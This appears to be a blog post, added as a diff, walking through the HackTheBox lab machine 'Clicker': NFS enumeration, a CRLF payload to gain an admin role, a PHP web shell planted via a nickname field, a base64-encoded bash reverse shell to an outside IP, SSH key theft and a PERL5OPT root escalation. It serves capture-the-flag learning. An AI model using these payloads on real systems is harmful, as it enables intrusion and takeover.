@@ -1,0 +1,116 @@
+---
+layout: post
+title: "Clicker 2631e18944b846e4ab17528fdc8d13cf"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Clicker
+
+HackTheBox: Medium
+
+<aside>
+💡 Visual is a linux  machine which handles with mount files
+
+</aside>
+
+## 1: Enumeration
+
+- nmap scanning: Making port scanning we find
+1. 80-http
+2. 22-ssh
+3. 111-rcbind
+4. 2049 nfs-acl 
+
+A server with share mounts
+
+```bash
+mkdir -p /mnt/nfs_file_shares
+cd mnt 
+mount -o nolock 10.10.11.232:/mnt/nfs_files_shares
+cd backups
+```
+
+## 2: User flag
+
+Copy those files to our workspace
+
+- We found some php files looking around (save.php) theres an admin role, we go to http service and register as a user.
+- We register burp suite to check request and responses and sent a request changing the role. using CRLF vulnerability
+
+```bash
+&role%0a=Admin
+```
+
+- Log out and log in again
+- We can export some results and change the extension with burp suite for excecute commands in php
+- There’s a vulnerable parameter called nickname
+
+```bash
+&nickname=<%3fphp+system($_GET['CMD'])+%3f>)
+```
+
+Once inside of php file we use
+
+```bash
+<file_name>.php?cmd=cat/etc/passwd
+```
+
+A user called jack in the machine
+
+We are ready to be data
+
+```bash
+echo "sh -i >& /dev/tcp/<your_ip>/9001 0>&1" | base64
+```
+
+```bash
+echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzkwMDEgMD4mMQo=%22%20|%20base64%20-d%20|%20bash
+```
+
+Estabilize using python
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+```
+
+There is a PKI we can see it executing
+
+```bash
+./execute_query 5 ../.ssh/id_rsa
+```
+
+This key has a problem with the format, just change the format and use
+
+```bash
+chmod 600 id_rsa 
+sudo ssh -i id_rsa jack@10.10.11.232
+```
+
+![Untitled]({{ '/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled.png' | relative_url }})
+
+## 3: Priv esc
+
+```bash
+sudo -l
+```
+
+![Untitled]({{ '/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_1.png' | relative_url }})
+
+[monitor.sh](http://monitor.sh) execute a xml_pp file lets see what it is
+
+![Untitled]({{ '/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_2.png' | relative_url }})
+
+This vulnerability is called as “perl_startup” Privilege Escalation.
+
+That enabled me to execute scripts with root privileges, as I had the ability to configure the environment while running Perl.
+
+```bash
+sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
+bash -p
+```
+
+Machine pwned!!!!
